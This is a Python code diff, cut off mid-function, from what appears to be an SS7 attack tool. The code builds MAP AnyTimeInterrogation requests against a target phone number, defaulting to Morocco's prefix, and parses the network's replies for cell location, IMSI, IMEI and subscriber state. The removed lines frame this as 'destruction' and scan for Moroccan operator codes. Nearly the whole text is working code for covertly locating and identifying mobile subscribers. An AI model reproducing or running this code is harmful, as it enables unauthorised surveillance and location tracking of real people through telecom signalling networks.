+    return build_manual_tcap_message_fixed(otid, ati_variant, target_msisdn)
+
+def build_pycrate_tcap_message(otid: bytes, ati_variant: AtiVariant, target_msisdn: str) -> bytes:
+    """Build TCAP message using Pycrate"""
+    
+    TCMessage = deepcopy(PYCRATE['TCAP_defs'].TCMessage)
+    
+    # Build ATI parameter
+    ati_param = build_ati_parameter_professional(ati_variant, target_msisdn)
+    
+    # Build the message structure
+    tcap_msg = {
+        'begin': {
+            'otid': otid,
+            'dialoguePortion': {
+                'version1': {
+                    'oid': [0, 4, 0, 0, 1, 0, 5, 3],  # MAP v3 Application Context
+                    'asn1-xstring': None
+                }
+            },
+            'components': [{
+                'invoke': {
+                    'invokeId': 1,
+                    'opcode': {'localValue': MAP_OP_ANY_TIME_INTERROGATION},
+                    'parameter': ati_param
+                }
+            }]
         }
-    
-    legendary_print(f"🔍 ANALYZING RESPONSE with LEGENDARY intelligence: {len(response_data)} bytes", 
-                   DestroyerColors.DESTROYER_BLUE, bold=True)
-    
-    result = {
-        "success": False,
-        "destruction_level": "MINIMAL",
-        "tcap_outcome": "ResponseReceived",
-        "location_info": LegendaryLocationInfo(),
-        "subscriber_info": LegendarySubscriberInfo(),
-        "info": f"Received {len(response_data)} bytes for analysis"
     }
     
+    TCMessage.set_val(tcap_msg)
+    result = TCMessage.to_ber()
+    
+    if len(result) == 0:
+        raise ValueError("Pycrate generated empty TCAP message")
+    
+    print_colored(f"✅ Pycrate TCAP message built: {len(result)} bytes", Colors.GREEN)
+    return result
+
+def build_manual_tcap_message_fixed(otid: bytes, ati_variant: AtiVariant, target_msisdn: str) -> bytes:
+    """Build TCAP message manually with guaranteed reliability"""
+    
+    tcap_msg = bytearray()
+    
+    # TCAP Begin
+    tcap_msg.append(TCAP_TAGS['MSG_BEGIN'])
+    
+    # Placeholder for total length
+    length_pos = len(tcap_msg)
+    tcap_msg.append(0x00)
+    
+    # OTID
+    tcap_msg.append(TCAP_TAGS['OTID'])
+    tcap_msg.append(len(otid))
+    tcap_msg.extend(otid)
+    
+    # Dialogue Portion
+    dialogue = build_dialogue_portion_manual()
+    tcap_msg.append(TCAP_TAGS['DIALOGUE_PORTION'])
+    tcap_msg.append(len(dialogue))
+    tcap_msg.extend(dialogue)
+    
+    # Component Portion
+    component = build_component_portion_manual(ati_variant, target_msisdn)
+    tcap_msg.append(TCAP_TAGS['COMPONENT_PORTION'])
+    tcap_msg.append(len(component))
+    tcap_msg.extend(component)
+    
+    # Update total length
+    total_length = len(tcap_msg) - 2
+    if total_length > 255:
+        raise ValueError("TCAP message too long for single byte length")
+    tcap_msg[length_pos] = total_length
+    
+    result = bytes(tcap_msg)
+    
+    if len(result) == 0:
+        raise ValueError("Manual TCAP construction resulted in empty message")
+    
+    print_colored(f"✅ Manual TCAP message built: {len(result)} bytes", Colors.GREEN)
+    
+    if logger:
+        logger.debug(f"Manual TCAP hex: {result.hex()}")
+    
+    return result
+
+def build_dialogue_portion_manual() -> bytes:
+    """Build dialogue portion manually"""
+    dialogue = bytearray()
+    
+    # External tag
+    dialogue.append(0x28)
+    
+    # Length placeholder
+    length_pos = len(dialogue)
+    dialogue.append(0x00)
+    
+    # Object Identifier for MAP v3
+    dialogue.extend([
+        0x06, 0x08,  # OID tag and length
+        0x00, 0x04, 0x00, 0x00, 0x01, 0x00, 0x05, 0x03  # MAP v3 Application Context
+    ])
+    
+    # Single-ASN.1-type
+    dialogue.extend([
+        0xA0, 0x03,  # [0] IMPLICIT
+        0x02, 0x01, 0x00  # INTEGER 0 (MAP version)
+    ])
+    
+    # Update length
+    dialogue[length_pos] = len(dialogue) - 2
+    
+    return bytes(dialogue)
+
+def build_component_portion_manual(ati_variant: AtiVariant, target_msisdn: str) -> bytes:
+    """Build component portion manually"""
+    component = bytearray()
+    
+    # Invoke component
+    component.append(TCAP_TAGS['COMP_INVOKE'])
+    
+    # Length placeholder
+    length_pos = len(component)
+    component.append(0x00)
+    
+    # Invoke ID
+    component.extend([0x02, 0x01, 0x01])  # INTEGER 1
+    
+    # Operation Code
+    component.extend([0x02, 0x01, MAP_OP_ANY_TIME_INTERROGATION])  # ATI operation
+    
+    # Parameter
+    parameter = build_ati_parameter_manual(ati_variant, target_msisdn)
+    component.extend(parameter)
+    
+    # Update length
+    component[length_pos] = len(component) - 2
+    
+    return bytes(component)
+
+def build_ati_parameter_professional(ati_variant: AtiVariant, target_msisdn: str) -> bytes:
+    """Build ATI parameter using Pycrate if available"""
+    
     try:
-        # === SEARCH FOR CGI PATTERNS WITH DEMONIC PRECISION ===
-        location_info = find_legendary_cgi_patterns(response_data, unique_id)
-        if location_info:
-            result["location_info"] = location_info
-            result["success"] = True
-            result["destruction_level"] = "LOCATION_EXTRACTED"
-            result["tcap_outcome"] = "LocationSuccess"
+        if PYCRATE['MAP_defs'] is not None:
+            MAP_MS_DataTypes = getattr(PYCRATE['MAP_defs'], 'MAP_MS_DataTypes', None)
+            if MAP_MS_DataTypes:
+                AtiArgType = getattr(MAP_MS_DataTypes, 'AnyTimeInterrogationArg', None)
+                if AtiArgType:
+                    # Build using Pycrate
+                    msisdn_bytes = encode_msisdn_professional(target_msisdn)
+                    requested_info = build_requested_info_professional(ati_variant)
+                    
+                    ati_arg = deepcopy(AtiArgType)
+                    arg_value = {
+                        'subscriberIdentity': {
+                            'msisdn': msisdn_bytes
+                        },
+                        'requestedInfo': requested_info
+                    }
+                    
+                    ati_arg.set_val(arg_value)
+                    result = ati_arg.to_ber()
+                    
+                    if len(result) > 0:
+                        print_colored(f"✅ Pycrate ATI parameter built: {len(result)} bytes", Colors.GREEN)
+                        return result
+    except Exception as e:
+        if logger:
+            logger.debug(f"Pycrate ATI parameter failed: {e}")
+    
+    # Fallback to manual
+    return build_ati_parameter_manual(ati_variant, target_msisdn)
+
+def build_ati_parameter_manual(ati_variant: AtiVariant, target_msisdn: str) -> bytes:
+    """Build ATI parameter manually"""
+    param = bytearray()
+    
+    # ATI parameter SEQUENCE
+    param.append(0x30)  # SEQUENCE tag
+    
+    # Length placeholder
+    length_pos = len(param)
+    param.append(0x00)
+    
+    # Subscriber Identity
+    msisdn_bytes = encode_msisdn_manual(target_msisdn)
+    param.extend([
+        0xA0, len(msisdn_bytes) + 2,  # [0] SubscriberIdentity
+        0x81, len(msisdn_bytes)       # [1] MSISDN
+    ])
+    param.extend(msisdn_bytes)
+    
+    # Requested Info based on variant
+    requested_info = build_requested_info_manual(ati_variant)
+    param.extend(requested_info)
+    
+    # Update length
+    param[length_pos] = len(param) - 2
+    
+    return bytes(param)
+
+def build_requested_info_professional(ati_variant: AtiVariant) -> Dict:
+    """Build requested info structure with proper NULL encoding"""
+    
+    NULL_VALUE = PYCRATE['NULL']() if PYCRATE['NULL'] else None
+    
+    if ati_variant == AtiVariant.LOCATION_ONLY:
+        return {
+            'locationInformation': NULL_VALUE,
+            'subscriberState': NULL_VALUE
+        }
+    elif ati_variant == AtiVariant.SUBSCRIBER_STATE:
+        return {
+            'subscriberState': NULL_VALUE
+        }
+    elif ati_variant == AtiVariant.EQUIPMENT_STATUS:
+        return {
+            'subscriberState': NULL_VALUE,
+            'imei': NULL_VALUE
+        }
+    elif ati_variant == AtiVariant.ALL_INFO:
+        return {
+            'locationInformation': NULL_VALUE,
+            'subscriberState': NULL_VALUE,
+            'imei': NULL_VALUE
+        }
+    else:  # STANDARD and MINIMAL
+        return {
+            'locationInformation': NULL_VALUE
+        }
+
+def build_requested_info_manual(ati_variant: AtiVariant) -> bytes:
+    """Build requested info manually"""
+    info = bytearray()
+    
+    info.append(0xA1)  # [1] RequestedInfo
+    
+    length_pos = len(info)
+    info.append(0x00)
+    
+    if ati_variant in [AtiVariant.STANDARD, AtiVariant.LOCATION_ONLY, AtiVariant.ALL_INFO]:
+        info.extend([0x80, 0x00])  # [0] locationInformation NULL
+    
+    if ati_variant in [AtiVariant.SUBSCRIBER_STATE, AtiVariant.ALL_INFO]:
+        info.extend([0x81, 0x00])  # [1] subscriberState NULL
+    
+    if ati_variant in [AtiVariant.EQUIPMENT_STATUS, AtiVariant.ALL_INFO]:
+        info.extend([0x86, 0x00])  # [6] imei NULL
+    
+    # Update length
+    info[length_pos] = len(info) - 2
+    
+    return bytes(info)
+
+def encode_msisdn_professional(msisdn: str) -> bytes:
+    """Professional MSISDN encoder"""
+    try:
+        if PYCRATE['MAPIE'] is not None:
+            addr_str = PYCRATE['MAPIE'].AddressString()
+            addr_str['NumType'].set_val(1)  # International number
+            addr_str['NumPlan'].set_val(1)  # ISDN/Telephony numbering plan
             
-            legendary_print(f"💀 LOCATION DATA EXTRACTED with GODLIKE precision!", 
-                           DestroyerColors.GODLIKE_GREEN, bold=True)
-        
-        # === SEARCH FOR SUBSCRIBER PATTERNS ===
-        subscriber_info = find_legendary_subscriber_patterns(response_data, unique_id)
-        if subscriber_info and subscriber_info.imsi != "N/A":
-            result["subscriber_info"] = subscriber_info
-            result["success"] = True
+            clean_msisdn = re.sub(r'[^\d]', '', msisdn)
+            if not clean_msisdn.startswith('212'):
+                clean_msisdn = '212' + clean_msisdn
             
-            if result["destruction_level"] == "LOCATION_EXTRACTED":
-                result["destruction_level"] = "TOTAL_DEVASTATION"
-            else:
-                result["destruction_level"] = "SUBSCRIBER_EXTRACTED"
-            
-            legendary_print(f"🔥 SUBSCRIBER DATA OBLITERATED and EXTRACTED!", 
-                           DestroyerColors.FIRE_RED, bold=True)
+            addr_str['Num'].encode(clean_msisdn)
+            return addr_str.to_bytes()
+    except Exception as e:
+        if logger:
+            logger.debug(f"Pycrate MSISDN encoding failed: {e}")
+    
+    # Fallback to manual
+    return encode_msisdn_manual(msisdn)
+
+def encode_msisdn_manual(msisdn: str) -> bytes:
+    """Manual MSISDN encoder"""
+    clean_msisdn = re.sub(r'[^\d]', '', msisdn)
+    
+    if not clean_msisdn.startswith('212'):
+        clean_msisdn = '212' + clean_msisdn
+    
+    result = bytearray()
+    result.append(0x91)  # International number, ISDN numbering plan
+    
+    digits = clean_msisdn
+    if len(digits) % 2 == 1:
+        digits += 'F'
+    
+    for i in range(0, len(digits), 2):
+        digit1 = int(digits[i])
+        digit2 = int(digits[i + 1]) if digits[i + 1] != 'F' else 0xF
+        result.append((digit2 << 4) | digit1)
+    
+    return bytes(result)
+
+# === Professional Response Parser ===
+
+def extract_tcap_from_sccp_professional(raw_response: bytes) -> Optional[bytes]:
+    """Professional TCAP extraction from SCCP"""
+    if not raw_response or len(raw_response) < 5:
+        return None
+    
+    try:
+        # Try Pycrate first
+        if PYCRATE['SCCP'] is not None:
+            sccp_msg, err = PYCRATE['SCCP'].parse_SCCP(raw_response)
+            if err == 0 and sccp_msg:
+                if sccp_msg['Type'].get_val() == 9:  # UDT
+                    data_field = sccp_msg.get('Data')
+                    if data_field and 'Value' in data_field:
+                        return data_field['Value'].get_val()
+    except Exception as e:
+        if logger:
+            logger.debug(f"Pycrate SCCP parsing failed: {e}")
+    
+    # Manual parsing fallback
+    try:
+        if raw_response[0] != 0x09:  # Not UDT
+            return None
         
-        # === ANALYZE TCAP COMPONENTS ===
-        tcap_analysis = analyze_tcap_components(response_data, unique_id)
-        if tcap_analysis:
-            result["tcap_outcome"] = tcap_analysis.get("outcome", result["tcap_outcome"])
-            result["info"] = tcap_analysis.get("info", result["info"])
+        if len(raw_response) < 5:
+            return None
         
-        # === CALCULATE POWER LEVELS ===
-        if result["location_info"].cgi_found:
-            result["location_info"].extraction_power = calculate_location_power(result["location_info"])
+        ptr_data = raw_response[4]
+        data_start = 5 + ptr_data - 1
         
-        if result["subscriber_info"].imsi != "N/A":
-            result["subscriber_info"].extraction_power = calculate_subscriber_power(result["subscriber_info"])
+        if data_start >= len(raw_response) or data_start < 0:
+            return None
         
-        legendary_print(f"⚡ ANALYSIS COMPLETE: {result['destruction_level']}", 
-                       DestroyerColors.LEGENDARY_GOLD, bold=True)
+        if raw_response[data_start] != 0x03:
+            return None
         
-        return result
+        if data_start + 1 >= len(raw_response):
+            return None
+        
+        data_length = raw_response[data_start + 1]
+        tcap_start = data_start + 2
+        
+        if tcap_start + data_length > len(raw_response):
+            return None
+        
+        return raw_response[tcap_start:tcap_start + data_length]
         
     except Exception as e:
-        legendary_print(f"💥 RESPONSE ANALYSIS EXPLODED: {e}", DestroyerColors.BLOOD_RED, bold=True)
-        result["info"] = f"Analysis error: {str(e)[:100]}"
+        if logger:
+            logger.debug(f"Manual SCCP parsing error: {e}")
+        return None
+
+def parse_response_professional(raw_response: bytes, unique_id: str) -> ScanResult:
+    """Professional response parser with enhanced error handling"""
+    
+    result = ScanResult()
+    result.tcap_outcome = 'ParseError'
+    result.error_info = 'Unknown parsing error'
+    
+    if not raw_response or len(raw_response) < 5:
+        result.error_info = f"Response too short: {len(raw_response)} bytes"
+        result.rejection_cause = "Invalid response length"
         return result
-
-def find_legendary_cgi_patterns(data: bytes, unique_id: str) -> Optional[LegendaryLocationInfo]:
-    """
-    Find CGI patterns with SUPERNATURAL precision and DEMONIC intelligence
-    This function PENETRATES any encoding and EXTRACTS location data
-    """
     
-    legendary_print(f"🔍 Scanning for CGI patterns with LEGENDARY precision...", 
-                   DestroyerColors.DESTROYER_BLUE)
+    result.raw_response_hex = raw_response.hex()
+    result.bytes_received = len(raw_response)
     
-    # Multiple scanning strategies for MAXIMUM coverage
-    strategies = ['sequential', 'pattern_matching', 'statistical', 'brute_force']
-    
-    for strategy in strategies:
-        location_info = None
+    try:
+        print_connection_status("", 0, "PARSING", f"Parsing {len(raw_response)} bytes", unique_id=unique_id)
         
+        # Extract TCAP payload
+        tcap_payload = extract_tcap_from_sccp_professional(raw_response)
+        if not tcap_payload:
+            result.error_info = "Failed to extract TCAP payload"
+            result.rejection_cause = "SCCP parsing failed"
+            return result
+        
+        if logger:
+            logger.debug(f"[{unique_id}] TCAP payload extracted: {len(tcap_payload)} bytes")
+        
+        # Parse TCAP message
         try:
-            if strategy == 'sequential':
-                location_info = sequential_cgi_scan(data, unique_id)
-            elif strategy == 'pattern_matching':
-                location_info = pattern_matching_cgi_scan(data, unique_id)
-            elif strategy == 'statistical':
-                location_info = statistical_cgi_scan(data, unique_id)
-            else:  # brute_force
-                location_info = brute_force_cgi_scan(data, unique_id)
-            
-            if location_info and location_info.cgi_found:
-                legendary_print(f"💀 CGI EXTRACTED using {strategy} strategy!", 
-                               DestroyerColors.GODLIKE_GREEN, bold=True)
-                return location_info
+            if PYCRATE['TCAP_defs'] is not None:
+                tcap_message = deepcopy(PYCRATE['TCAP_defs'].TCMessage)
+                tcap_message.from_ber(tcap_payload)
+                tcap_val = tcap_message.get_val()
                 
-        except Exception as e:
-            legendary_print(f"⚠️  {strategy} strategy failed: {e}", DestroyerColors.FIRE_ORANGE)
-            continue
+                if logger:
+                    logger.debug(f"[{unique_id}] TCAP message parsed using Pycrate")
+                
+                # Process based on message type
+                if isinstance(tcap_val, tuple) and len(tcap_val) >= 2:
+                    msg_type, msg_content = tcap_val[0], tcap_val[1]
+                    
+                    if msg_type in ['end', 'continue']:
+                        result = process_tcap_response_professional(msg_content, unique_id, result)
+                    elif msg_type == 'abort':
+                        result.tcap_outcome = 'Abort'
+                        result.error_info = "TCAP Abort received"
+                        result.rejection_cause = "TCAP Abort"
+                    else:
+                        result.tcap_outcome = f"Unknown_TCAP({msg_type})"
+                        result.error_info = f"Unknown TCAP message type: {msg_type}"
+            else:
+                raise Exception("Pycrate TCAP not available")
+            
+        except Exception as tcap_error:
+            if logger:
+                logger.debug(f"[{unique_id}] TCAP parsing failed: {tcap_error}")
+            
+            # Fallback to manual parsing
+            result = parse_components_manually_professional(tcap_payload, unique_id, result)
+        
+    except Exception as e:
+        if logger:
+            logger.error(f"[{unique_id}] Response parsing exception: {e}")
+        result.error_info = f"Parsing exception: {str(e)[:100]}"
+        result.rejection_cause = f"Parser error: {type(e).__name__}"
     
-    return None
+    return result
 
-def sequential_cgi_scan(data: bytes, unique_id: str) -> Optional[LegendaryLocationInfo]:
-    """Sequential CGI scan with LEGENDARY precision"""
+def process_tcap_response_professional(msg_content: Any, unique_id: str, result: ScanResult) -> ScanResult:
+    """Professional TCAP response processor"""
+    
+    try:
+        if isinstance(msg_content, dict):
+            # Extract DTID
+            if 'dtid' in msg_content:
+                result.received_dtid = msg_content['dtid'].hex() if isinstance(msg_content['dtid'], bytes) else str(msg_content['dtid'])
+            
+            # Process components
+            if 'components' in msg_content and msg_content['components']:
+                components = msg_content['components']
+                
+                for component in components:
+                    if isinstance(component, tuple) and len(component) >= 2:
+                        comp_type, comp_data = component[0], component[1]
+                        
+                        if comp_type == 'returnResultLast':
+                            result.tcap_outcome = 'ReturnResultLast'
+                            result.success = True
+                            
+                            # Try to parse MAP response
+                            if isinstance(comp_data, dict) and 'resultretres' in comp_data:
+                                param_data = comp_data['resultretres'].get('parameter', b'')
+                                if isinstance(param_data, bytes):
+                                    enhanced_result = decode_ati_response_professional(param_data, unique_id)
+                                    if enhanced_result:
+                                        result.location_info = enhanced_result.location_info
+                                        result.subscriber_info = enhanced_result.subscriber_info
+                                        result.map_version = enhanced_result.map_version
+                                        result.error_info = "MAP ATI Response parsed successfully"
+                                        break
+                        
+                        elif comp_type == 'returnError':
+                            result.tcap_outcome = 'ReturnError'
+                            if isinstance(comp_data, dict) and 'errorCode' in comp_data:
+                                error_code = comp_data['errorCode']
+                                result.error_code = error_code
+                                result.error_info = MAP_ERRORS.get(error_code, f"MAP Error {error_code}")
+                                result.rejection_cause = f"MAP Error {error_code}"
+                        
+                        elif comp_type == 'reject':
+                            result.tcap_outcome = 'Reject'
+                            result.error_info = "TCAP Reject received"
+                            result.rejection_cause = "TCAP Reject"
+    
+    except Exception as e:
+        if logger:
+            logger.debug(f"[{unique_id}] TCAP response processing error: {e}")
+    
+    return result
+
+def parse_components_manually_professional(tcap_payload: bytes, unique_id: str, result: ScanResult) -> ScanResult:
+    """Manual component parser as fallback"""
+    
+    if len(tcap_payload) < 2:
+        result.error_info = "TCAP payload too short for manual parsing"
+        result.rejection_cause = "Invalid TCAP length"
+        return result
+    
+    tcap_type = tcap_payload[0]
+    
+    if tcap_type in [TCAP_TAGS['MSG_END'], TCAP_TAGS['MSG_CONTINUE']]:
+        offset = 2
+        
+        while offset < len(tcap_payload) - 1:
+            tag = tcap_payload[offset]
+            
+            if tag == TCAP_TAGS['COMPONENT_PORTION']:
+                length = tcap_payload[offset + 1]
+                comp_start = offset + 2
+                comp_end = comp_start + length
+                
+                if comp_end <= len(tcap_payload):
+                    comp_data = tcap_payload[comp_start:comp_end]
+                    result = parse_components_data_professional(comp_data, unique_id, result)
+                break
+            
+            offset += 1
+    
+    elif tcap_type == TCAP_TAGS['MSG_ABORT']:
+        result.tcap_outcome = 'Abort'
+        result.error_info = "TCAP Abort received"
+        result.rejection_cause = "TCAP Abort"
+    
+    return result
+
+def parse_components_data_professional(comp_data: bytes, unique_id: str, result: ScanResult) -> ScanResult:
+    """Professional component data parser"""
+    
+    offset = 0
+    
+    while offset < len(comp_data):
+        try:
+            if offset >= len(comp_data):
+                break
+            
+            comp_tag = comp_data[offset]
+            
+            if comp_tag == TCAP_TAGS['COMP_RETURN_RESULT_LAST']:
+                result.tcap_outcome = 'ReturnResultLast'
+                result.success = True
+                result.error_info = "ReturnResultLast detected"
+                
+                # Try to extract MAP response data
+                pattern_result = find_cgi_patterns_professional(comp_data[offset:], unique_id)
+                if pattern_result:
+                    result.location_info = pattern_result
+                
+                break
+                
+            elif comp_tag == TCAP_TAGS['COMP_RETURN_ERROR']:
+                result.tcap_outcome = 'ReturnError'
+                try:
+                    for i in range(offset, min(offset + 20, len(comp_data) - 1)):
+                        if comp_data[i] == 0x02 and i + 2 < len(comp_data):
+                            error_code = comp_data[i + 2]
+                            if error_code in MAP_ERRORS:
+                                result.error_info = MAP_ERRORS[error_code]
+                                result.error_code = error_code
+                                result.rejection_cause = f"MAP Error {error_code}"
+                                break
+                except Exception:
+                    result.error_info = "MAP Error detected"
+                    result.rejection_cause = "Unknown MAP Error"
+                break
+                
+            elif comp_tag == TCAP_TAGS['COMP_REJECT']:
+                result.tcap_outcome = 'Reject'
+                result.error_info = "TCAP Reject detected"
+                result.rejection_cause = "TCAP Component Reject"
+                break
+            
+            offset += 1
+            
+        except Exception as e:
+            if logger:
+                logger.debug(f"[{unique_id}] Component parsing error at offset {offset}: {e}")
+            break
+    
+    return result
+
+def find_cgi_patterns_professional(data: bytes, unique_id: str) -> Optional[EnhancedLocationInfo]:
+    """Professional CGI pattern finder"""
     
     for i in range(len(data) - 6):
         try:
-            # Try CGI extraction at this position
-            if i + 7 <= len(data):
-                test_cgi = data[i:i+7]
-                location_info = decode_legendary_cgi(test_cgi, unique_id)
-                if location_info and location_info.cgi_found:
-                    return location_info
-        except:
-            continue
-    
-    return None
-
-def pattern_matching_cgi_scan(data: bytes, unique_id: str) -> Optional[LegendaryLocationInfo]:
-    """Pattern matching CGI scan for SPECIFIC signatures"""
-    
-    # Look for specific PLMN patterns (Morocco: 604)
-    morocco_patterns = [
-        b'\x06\x04\xf0',  # MCC=604, MNC=00 (Maroc Telecom)
-        b'\x06\x04\xf1',  # MCC=604, MNC=01 (Orange Morocco)  
-        b'\x06\x04\xf2',  # MCC=604, MNC=02 (Inwi)
-    ]
-    
-    for pattern in morocco_patterns:
-        for i in range(len(data) - len(pattern)):
-            if data[i:i+len(pattern)] == pattern:
-                # Found PLMN pattern, try to extract full CGI
+            potential_plmn = data[i:i+3]
+            
+            # PLMN validation
+            valid_plmn = True
+            for byte in potential_plmn:
+                if ((byte & 0x0F) > 9 and (byte & 0x0F) != 0xF) or \
+                   (((byte >> 4) & 0x0F) > 9 and ((byte >> 4) & 0x0F) != 0xF):
+                    valid_plmn = False
+                    break
+            
+            if valid_plmn:
+                # Try CGI (7 bytes)
                 if i + 7 <= len(data):
                     test_cgi = data[i:i+7]
-                    location_info = decode_legendary_cgi(test_cgi, unique_id)
-                    if location_info and location_info.cgi_found:
-                        return location_info
-    
-    return None
-
-def statistical_cgi_scan(data: bytes, unique_id: str) -> Optional[LegendaryLocationInfo]:
-    """Statistical CGI scan using FREQUENCY analysis"""
-    
-    # Look for byte patterns that statistically indicate PLMN
-    for i in range(len(data) - 6):
-        try:
-            if i + 7 <= len(data):
-                test_bytes = data[i:i+7]
-                
-                # Statistical validation of PLMN-like pattern
-                plmn_bytes = test_bytes[:3]
-                score = 0
-                
-                # Check if bytes look like BCD encoded MCC/MNC
-                for byte in plmn_bytes:
-                    low_nibble = byte & 0x0F
-                    high_nibble = (byte >> 4) & 0x0F
-                    
-                    if low_nibble <= 9 or low_nibble == 0xF:
-                        score += 1
-                    if high_nibble <= 9 or high_nibble == 0xF:
-                        score += 1
-                
-                # If score is high enough, try decoding
-                if score >= 5:  # At least 5 valid nibbles
-                    location_info = decode_legendary_cgi(test_bytes, unique_id)
-                    if location_info and location_info.cgi_found:
-                        return location_info
-        except:
-            continue
-    
-    return None
-
-def brute_force_cgi_scan(data: bytes, unique_id: str) -> Optional[LegendaryLocationInfo]:
-    """Brute force CGI scan with MAXIMUM coverage"""
-    
-    # Try every possible position with AGGRESSIVE validation
-    for i in range(len(data) - 6):
-        for length in [5, 7, 9]:  # Try different CGI lengths
-            try:
-                if i + length <= len(data):
-                    test_data = data[i:i+length]
-                    location_info = decode_legendary_cgi(test_data, unique_id)
-                    if location_info and location_info.cgi_found:
-                        return location_info
-            except:
-                continue
-    
-    return None
-
-def decode_legendary_cgi(cgi_data: bytes, unique_id: str) -> Optional[LegendaryLocationInfo]:
-    """
-    Decode CGI with GODLIKE precision and ZERO tolerance for errors
-    This function OBLITERATES encoding barriers and EXTRACTS perfect location data
-    """
-    
-    if len(cgi_data) < 5:
-        return None
-    
-    try:
-        # Extract PLMN (first 3 bytes)
-        plmn = cgi_data[:3]
-        byte1, byte2, byte3 = plmn
-        
-        # Decode MCC with LEGENDARY precision
-        mcc_digit1 = (byte1 >> 4) & 0x0F
-        mcc_digit2 = byte1 & 0x0F
-        mcc_digit3 = (byte2 >> 4) & 0x0F
-        
-        # Decode MNC with SUPERNATURAL accuracy
-        mnc_digit1 = (byte3 >> 4) & 0x0F
-        mnc_digit2 = byte3 & 0x0F
-        mnc_digit3 = byte2 & 0x0F
-        
-        # Validate MCC digits
-        if any(d > 9 for d in [mcc_digit1, mcc_digit2, mcc_digit3]):
-            return None
-        
-        mcc = f"{mcc_digit1}{mcc_digit2}{mcc_digit3}"
-        
-        # Validate and build MNC
-        if mnc_digit3 == 0xF:
-            # 2-digit MNC
-            if any(d > 9 for d in [mnc_digit1, mnc_digit2]):
-                return None
-            mnc = f"{mnc_digit1}{mnc_digit2}"
-        else:
-            # 3-digit MNC
-            if any(d > 9 for d in [mnc_digit1, mnc_digit2, mnc_digit3]):
-                return None
-            mnc = f"{mnc_digit1}{mnc_digit2}{mnc_digit3}"
-        
-        # Validate MCC/MNC ranges for reasonableness
-        mcc_int = int(mcc)
-        mnc_int = int(mnc)
-        
-        if not (200 <= mcc_int <= 999):  # Valid MCC range
-            return None
-        
-        if not (0 <= mnc_int <= 999):  # Valid MNC range
-            return None
-        
-        # Extract LAC and Cell ID
-        if len(cgi_data) >= 5:
-            lac = int.from_bytes(cgi_data[3:5], 'big')
-        else:
-            lac = 0
-        
-        if len(cgi_data) >= 7:
-            cell_id = int.from_bytes(cgi_data[5:7], 'big')
-        else:
-            cell_id = 0
-        
-        # Validate LAC and Cell ID ranges
-        if not (0 < lac < 65536):
-            return None
-        
-        if len(cgi_data) >= 7 and not (0 < cell_id < 65536):
-            return None
-        
-        # Create LEGENDARY location info
-        location_info = LegendaryLocationInfo()
-        location_info.mcc = mcc
-        location_info.mnc = mnc
-        location_info.lac = str(lac)
-        
-        if len(cgi_data) >= 7:
-            location_info.cell_id = str(cell_id)
-            location_info.cgi_found = True
-            
-            legendary_print(f"💀 LEGENDARY CGI EXTRACTED: MCC={mcc}, MNC={mnc}, LAC={lac}, CI={cell_id}", 
-                           DestroyerColors.GODLIKE_GREEN, bold=True)
-        else:
-            location_info.lai_found = True
-            
-            legendary_print(f"⚡ LEGENDARY LAI EXTRACTED: MCC={mcc}, MNC={mnc}, LAC={lac}", 
-                           DestroyerColors.GODLIKE_GREEN, bold=True)
-        
-        return location_info
-        
-    except Exception as e:
-        # Silent failure for invalid data - this is normal during scanning
-        return None
-
-def find_legendary_subscriber_patterns(data: bytes, unique_id: str) -> Optional[LegendarySubscriberInfo]:
-    """
-    Find subscriber patterns with DEMONIC intelligence and SUPERNATURAL extraction
-    This function OBLITERATES subscriber data hiding and EXTRACTS everything
-    """
-    
-    legendary_print(f"🔍 Hunting for SUBSCRIBER patterns with DEMONIC intelligence...", 
-                   DestroyerColors.DESTROYER_BLUE)
-    
-    subscriber_info = LegendarySubscriberInfo()
-    found_data = False
-    
-    try:
-        # === SEARCH FOR IMSI PATTERNS ===
-        imsi = extract_legendary_imsi(data, unique_id)
-        if imsi and imsi != "N/A":
-            subscriber_info.imsi = imsi
-            found_data = True
-            legendary_print(f"🔥 IMSI OBLITERATED and EXTRACTED: {imsi}", 
-                           DestroyerColors.FIRE_RED, bold=True)
-        
-        # === SEARCH FOR MSISDN PATTERNS ===
-        msisdn = extract_legendary_msisdn(data, unique_id)
-        if msisdn and msisdn != "N/A":
-            subscriber_info.msisdn = msisdn
-            found_data = True
-            legendary_print(f"💀 MSISDN DESTROYED and CAPTURED: {msisdn}", 
-                           DestroyerColors.MYTHIC_PURPLE, bold=True)
-        
-        # === SEARCH FOR IMEI PATTERNS ===
-        imei = extract_legendary_imei(data, unique_id)
-        if imei and imei != "N/A":
-            subscriber_info.imei = imei
-            found_data = True
-            legendary_print(f"⚡ IMEI ANNIHILATED and SEIZED: {imei}", 
-                           DestroyerColors.DIVINE_CYAN, bold=True)
-        
-        return subscriber_info if found_data else None
-        
-    except Exception as e:
-        legendary_print(f"💥 SUBSCRIBER PATTERN SEARCH EXPLODED: {e}", DestroyerColors.BLOOD_RED)
-        return None
-
-def extract_legendary_imsi(data: bytes, unique_id: str) -> Optional[str]:
-    """Extract IMSI with GODLIKE precision"""
-    
-    # IMSI patterns: 15 digits, starts with MCC+MNC
-    for i in range(len(data) - 7):
-        try:
-            # Look for TBCD encoded IMSI
-            if i + 8 <= len(data):
-                imsi_bytes = data[i:i+8]
-                
-                # Decode TBCD
-                imsi_digits = []
-                for byte in imsi_bytes:
-                    low_nibble = byte & 0x0F
-                    high_nibble = (byte >> 4) & 0x0F
-                    
-                    if low_nibble <= 9:
-                        imsi_digits.append(str(low_nibble))
-                    if high_nibble <= 9 and high_nibble != 0xF:
-                        imsi_digits.append(str(high_nibble))
-                
-                if len(imsi_digits) >= 14:
-                    imsi = ''.join(imsi_digits[:15])
-                    
-                    # Validate IMSI format (should start with valid MCC)
-                    if len(imsi) >= 6:
-                        mcc = imsi[:3]
-                        if 200 <= int(mcc) <= 999:
-                            return imsi
-        except:
-            continue
-    
-    return None
-
-def extract_legendary_msisdn(data: bytes, unique_id: str) -> Optional[str]:
-    """Extract MSISDN with SUPERNATURAL accuracy"""
-    
-    # Look for international MSISDN patterns
-    for i in range(len(data) - 5):
-        try:
-            if i + 7 <= len(data):
-                # Check for international indicator (0x91)
-                if data[i] == 0x91:
-                    msisdn_bytes = data[i+1:i+7]
-                    
-                    # Decode TBCD
-                    msisdn_digits = []
-                    for byte in msisdn_bytes:
-                        low_nibble = byte & 0x0F
-                        high_nibble = (byte >> 4) & 0x0F
+                    try:
+                        mcc, mnc = decode_plmn_professional(test_cgi[:3])
+                        lac = int.from_bytes(test_cgi[3:5], 'big')
+                        ci = int.from_bytes(test_cgi[5:7], 'big')
                         
-                        if low_nibble <= 9:
-                            msisdn_digits.append(str(low_nibble))
